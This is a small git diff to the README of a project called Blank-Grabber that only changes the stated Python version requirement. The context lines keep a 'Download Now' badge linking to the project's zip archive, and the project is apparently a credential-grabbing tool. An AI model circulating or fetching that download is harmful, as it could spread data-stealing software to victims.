@@ -2,7 +2,7 @@
 
 [![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/Blank-c/Blank-Grabber/archive/refs/heads/main.zip)
 
-_Requires Python 3.9+_
+_*Requires Python 3*_
 
 ### Features:
 
